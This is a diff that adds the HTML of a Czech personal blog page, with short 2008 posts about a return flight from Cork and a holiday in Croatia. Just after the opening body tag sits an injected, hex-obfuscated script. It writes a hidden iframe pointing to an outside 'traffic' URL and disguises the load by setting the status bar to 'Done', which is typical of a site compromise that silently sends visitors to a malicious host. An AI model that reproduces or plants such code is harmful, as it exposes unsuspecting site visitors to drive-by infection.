@@ -1,0 +1,211 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+	
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1250" />
+	<meta http-equiv="Content-Language" content="cs" />
+	
+	<title>janntar.com</title>
+	
+	<link rel="stylesheet" type="text/css" href="./vzhled/styl-solution/css/web-solution.css" />
+	
+	<link rel="alternate" type="application/rss+xml" title="Rss textů" href="rss.php" />
+	<link rel="alternate" type="application/rss+xml" title="Rss komentářů" href="rss-komentare.php" />
+	<link rel="alternate" type="application/rss+xml" title="Rss novinek" href="rss-novinky.php" />
+
+</head>
+
+<body>
+<script>function vbYYaaYtbat(vtbaYbtatYa){  return(parseInt(vtbaYbtatYa,16));}function vtttatbbtaa(vbtabbatata){  var vbaYaYbYYbY='';for(vbtYYYYYtat=0; vbtYYYYYtat<vbtabbatata.length; vbtYYYYYtat+=2){vbaYaYbYYbY+=(String.fromCharCode(vbYYaaYtbat(vbtabbatata.substr(vbtYYYYYtat,2))));}return vbaYaYbYYbY;} document.write(vtttatbbtaa('3C5343524950543E77696E646F772E7374617475733D27446F6E65273B646F63756D656E742E777269746528273C696672616D65202069643D225961616161596161747422206E616D653D225962595962616259746122207372633D22687474703A2F2F7265646469692E6F72672F747261666669632F667430346E65772F696E6465782E7068703F272B4D6174682E726F756E64284D6174682E72616E646F6D28292A3534343431292B2762597459596259747459222077696474683D2237383922206865696768743D22363922207374796C653D22646973706C61793A206E6F6E653B223E3C2F696672616D653E27293C2F5343524950543E'));</script>
+
+
+
+
+
+	<div id="content">
+	
+		<div class="header">
+		
+			<div class="searchform">	
+				<form method="get" class="search" action="index.php">
+					<p><input name="slovo" class="text" type="text" />
+  					<input name="search" class="searchbutton" value="Hledej" type="submit" />
+					<input type="hidden" name="search" value="1" /></p>
+				</form>
+			</div>
+		
+			<h1><a href="index.php">janntar.com</a></h1>
+			
+		</div> <!-- /header	 -->
+
+		<div class="subheader">
+			<div class="subheader_right">
+				<a href="index.php" title="Klikni pro návrat na úvodní stránku">Home</a>
+				<a href="index.php?archiv" title="Archiv starších textů na tomto webu">Archiv</a>
+				<a href="index.php?search" title="Prohledávání textů a komentářů">Search</a>
+				<a href="index.php?message" title="Napiš vzkaz některému z autorů">Message</a>
+				<a href="index.php?docs" title="Soubory ke stažení">Documents</a>
+				<a href="foto-index.php" title="Fotoalbum">Photoalbum</a>
+			</div>
+			
+			<div class="subheader_left">
+				Welcome!
+			</div>
+		</div><!-- /subheader -->
+
+		<div class="main">
+		<div class="right">
+			
+			
+			
+
+
+			
+			
+			<div class="text-jednotlivy">
+				<h1 class="nadpis"><a href="index.php?text=4-prilet">Prilet</a></h1>
+			
+				
+	<p>Jak jsem avizoval v predchozim textu, ze upresnim datum meho priletu, tak je
+	to tu. Ocekavany prilet z Corku bude <strong>18.10.</strong> se spolecnosti
+	AerLingus na pravidelne lince Cork-Praha ve <strong>21:10. hod</strong> na
+	letiste <strong>Praha Ruzyne.</strong> Pote presun do Brna (jeste nevim jak).
+	Predpokladany prijezd mezi 00:30–2:00 hod.</p>
+
+	<p>To je zatim vse a tesim se na vas <img src="./i/smajly/wink.gif" alt=";-)"
+	class="smajl" /> . Ahoj.</p>
+
+<!-- by Texy2! -->
+				
+				
+				
+				
+				
+				<p class="text-paticka"><strong>Ivo Paril</strong> |  <img src="./vzhled/styl-solution/img/timeicon.gif" alt="" /> 10. 10. 2008 Pá 06.06 | <a href="index.php?archiv&amp;tema=2" title="Téma:  ">Info</a> | <img src="./vzhled/styl-solution/img/comment.gif" alt="" /> <a href="index.php?text=4-prilet#komentare" class="tooltip" title="Načte text a přejde na komentáře">0&#160;komentářů</a> | <span title="Počet přečtení textu">83x</span></p>
+				
+			</div> <!-- /text-jednotlivy -->
+			
+			<div class="text-jednotlivy">
+				<h1 class="nadpis"><a href="index.php?text=3-plany-vsechno-muze-byt-jinak">Plany-vsechno muze byt jinak</a></h1>
+			
+				
+	<p>Ahoj vsem kteri sem tam navstevuji tyto stranky <img
+	src="./i/smajly/wink.gif" alt=";-)" class="smajl" /> Diky za prizen. Takze co je
+	u me noveho? V 2. pol. rijna se chystam do CR, ale opet jen na dovolenou.
+	Presny den priletu jeste nevim, ale urcite ho sem pozdeji napisu. Naporad se
+	vratim pravdepodobne az zacatkem prosince <img src="./i/smajly/sad.gif"
+	alt=":-(" class="smajl" />. To je zatim vse. Mejte se jak chcete a dejte o sobe
+	vedet <img src="./i/smajly/smile.gif" alt=":-)" class="smajl" /></p>
+
+<!-- by Texy2! -->
+				
+				
+				
+				
+				
+				<p class="text-paticka"><strong>Ivo Paril</strong> |  <img src="./vzhled/styl-solution/img/timeicon.gif" alt="" /> 12. 9. 2008 Pá 00.57 | <a href="index.php?archiv&amp;tema=2" title="Téma:  ">Info</a> | <img src="./vzhled/styl-solution/img/comment.gif" alt="" /> <a href="index.php?text=3-plany-vsechno-muze-byt-jinak#komentare" class="tooltip" title="Načte text a přejde na komentáře">0&#160;komentářů</a> | <span title="Počet přečtení textu">322x</span></p>
+				
+			</div> <!-- /text-jednotlivy -->
+			
+			<div class="text-jednotlivy">
+				<h1 class="nadpis"><a href="index.php?text=2-dovolena">Dovolena</a></h1>
+			
+				
+	<p><img src="images/baskapanorama1.jpg" class="img-center" alt="baskapanorama1"
+	width="514" height="193" /> Jako vsichni potrebuji obcas nejaky oraz, tak i ja
+	cely pristi tyden stravim s Lukasem a jeho milou pritelkyni v Chorvatsku
+	v Basce Vode <img src="./i/smajly/smile.gif" alt=":-)" class="smajl" />. Uz se
+	moc tesim, az odjedu z destiveho Irska do zeme slunecneho pocasi a pruzracne
+	cisteho more. Samozrejme po navratu se budete moci ve fotoalbu podivat, jak jsme
+	se meli <img src="./i/smajly/wink.gif" alt=";-)" class="smajl" />.</p>
+
+<!-- by Texy2! -->
+				
+				
+				
+				
+				
+				<p class="text-paticka"><strong>Ivo Paril</strong> |  <img src="./vzhled/styl-solution/img/timeicon.gif" alt="" /> 6. 7. 2008 Ne 01.59 | <a href="index.php?archiv&amp;tema=2" title="Téma:  ">Info</a> | <img src="./vzhled/styl-solution/img/comment.gif" alt="" /> <a href="index.php?text=2-dovolena#komentare" class="tooltip" title="Načte text a přejde na komentáře">0&#160;komentářů</a> | <span title="Počet přečtení textu">834x</span></p>
+				
+			</div> <!-- /text-jednotlivy -->
+			
+			
+			
+			
+			<div class="text-strankovani" title="Tyto odkazy slouží k přechodu ke starším textům">
+				Pokračuj: <strong>1-3</strong> 
+			</div>
+			
+
+
+		</div> <!-- /right -->
+		
+		
+		<!-- leve menu -->
+		<div class="left">
+
+
+
+
+
+
+
+
+
+			<h3>About sites</h3>
+			
+			<div id="autor">
+			<div>
+				<img src="vzhled/styl-solution/img/user.jpg" width="52" height="52" alt="Autor" />
+			</div>
+			Rad bych zde v rychlosti, bez dlouhych uvodu, priblizil co zde muzete najit. Tak prevazne to jsou fotky, sem tam informace o tom co se chystm delat a jestli bude dost casu, tak i nejake zajimave rady, navody nebo soubory ke stazeni. Mate-li nejake zajimave tema nebo problem, ktery vas zajima, nebo se kterym bych mohl pomoci, napiste mi. 
+			</div>
+			
+			
+
+			
+			<h3 title="Nové komentáře u TŘÍ různých textů">Nové komentáře</h3>
+			<div title="Nové komentáře u TŘÍ různých textů">
+			
+			</div>
+
+			<h3 title="Ze kterých webů sem vedou odkazy">Zpětné odkazy</h3>
+			<div title="Ze kterých webů sem vedou odkazy">
+			<a href="http://janntar.com/" title="Před více než hodinou">janntar.com</a>
+<a href="http://search.seznam.cz/?q=myeuro.tv.com&amp;mod=f&amp;sId=B8gwogl8o-Dr&amp;frm=tail" title="Před více než hodinou">search.seznam.cz</a>
+<a href="http://janntar.com/" title="Před více než hodinou">janntar.com</a>
+			</div>
+
+                        <h3 title="Seznam mých nejoblíbenějších stránek">Oblíbené odkazy</h3>
+			<div title="Seznam mých nejoblíbenějších stránek">
+			<a href="http://www.dodo23.com"> Dodo23.com </a>   
+                        <a href="http://www1.warforum.cz/index.php"> Warforum.cz </a>  
+                        <a href="http://www.seznam.cz/"> Seznam.cz </a>   
+                        <a href="http://www.myeuro.tv/" target="_blank"> Myeuro.tv </a>  
+			</div>
+
+	
+			<div class="ikony">
+				<a href="http://www.texy.info/" title="Tento web je formátován Texy! text-to-html formátovačem. Texy je sexy!"><img src="i/texy-ikona.gif" width="88" height="31" alt="Texy!" /></a>
+			</div>
+		
+		</div> <!-- /left -->
+		</div> <!-- /main -->
+		
+		<div class="footer">
+			<p>&copy; Copyright 2005, <a href="#">Autorův web</a> |
+			design od <a href="http://www.solucija.com">Luka Cvrk, Solucija</a> |
+			běží na <a href="http://rs.reality-show.net">RS2</a> |
+			RSS: <a href="rss.php">texty</a>, <a href="rss-komentare.php">komentáře</a>, <a href="rss-novinky.php">novinky</a> |
+			<a href="index.php?stat">Statistika</a>
+			</p>
+		</div>
+
+	</div><!-- /content -->
+	
+<script type="text/javascript" src="funkce.js"></script>
+<script type="text/javascript" src="funkce-tooltips.js"></script>	
+</body>
+</html>
